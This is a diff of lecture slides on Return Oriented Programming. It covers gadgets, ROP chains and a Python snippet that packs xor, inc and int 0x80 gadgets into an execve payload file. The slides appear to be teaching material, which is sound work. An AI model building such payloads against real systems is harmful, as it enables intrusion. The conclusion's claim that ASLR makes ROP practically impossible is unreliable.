Return Oriented Programming

### 2023-02-14 presentation.tex
changes

\begin{frame}[fragile]
    \frametitle{Useful gadgets: Arithmetics, System calls}
    \begin{itemize}
        \item Artihmetics: add, xor, inc \ldots allow us to manipulate register contents
        \item System calls: Programs run in userspace with limited privileges, system calls allow to execute operations which require higher privileges.
    \end{itemize}
\begin{lstlisting}[style=result]
int 0x80; ret;
\end{lstlisting}
\end{frame}
\subsection{ROP chain}
\begin{frame}
    \frametitle{ROP chain with parameters}
    \begin{figure}[h]
        \caption{ROP Chain with parameter}
        \centering
        \includegraphics[width=0.18\textwidth]{./img/gadgetstack.png}\label{gadget2}
    \end{figure}
\end{frame}

@@

\begin{frame}[fragile]
    \frametitle{Generating the payload: Init eax, call syscall}
    \begin{lstlisting}[style=code, language=python]
p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
for i in range(12):
    p += pack('<I', inc_eax)
p += pack('<I', int_80) # call interrupt
print(str(p)[2:-1])
with open('payload', 'wb') as file:
    file.write(p)
    \end{lstlisting}
\end{frame}
\section{Conclusion}
\begin{frame}
    \frametitle{Conclusion}
    \begin{itemize}
        \item Return Oriented Programming is a very powerful technique
        \item It is able to execute any system call if there are enough rop gadgets
        \item There are many tools to simplify the process of finding ROP gadgets and generatating ROP payloads
        \item Modern desktops use aslr and other protection mechanisms $\rightarrow$ practically impossible to use ROP
    \end{itemize}
\end{frame}

>>>>

\begin{frame}[fragile]
    \frametitle{Useful gadgets: Arithmetics, System calls}
    \begin{itemize}
        \item Artihmetics: add, xor, inc \ldots allow us to manipulate register contents
        \item System calls: Programs run in userspace with limited privileges, system calls allow to execute operations which require higher privileges.
    \end{itemize}
\begin{lstlisting}[style=result]
int 0x80;
\end{lstlisting}
\end{frame}
\subsection{ROP chain}
\begin{frame}
    \frametitle{ROP chain with parameters}
    \begin{figure}[h]
        \caption{ROP Chain with parameter}
        \centering
        \includegraphics[width=0.18\textwidth]{./img/gadgetstack.png}\label{gadget2}
    \end{figure}
\end{frame}

@@

\begin{frame}[fragile]
    \frametitle{Generating the payload: Init eax, call syscall}
    \begin{lstlisting}[style=code, language=python]
p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
for i in range(11):
    p += pack('<I', inc_eax)
p += pack('<I', int_80) # call interrupt
print(str(p)[2:-1])
with open('payload', 'wb') as file:
    file.write(p)
    \end{lstlisting}
\end{frame}
\section{Conclusion}
\begin{frame}
    \frametitle{Conclusion}
    \begin{itemize}
        \item Return Oriented Programming is a very powerful technique
        \item It is able to execute any system call if there are enough rop gadgets
        \item There are many tools to simplify the process of finding ROP gadgets and generatating ROP payloads
        \item Modern desktops use aslr and other protection mechanisms $\rightarrow$ practically impossible to use ROP
    \end{itemize}
\end{frame}
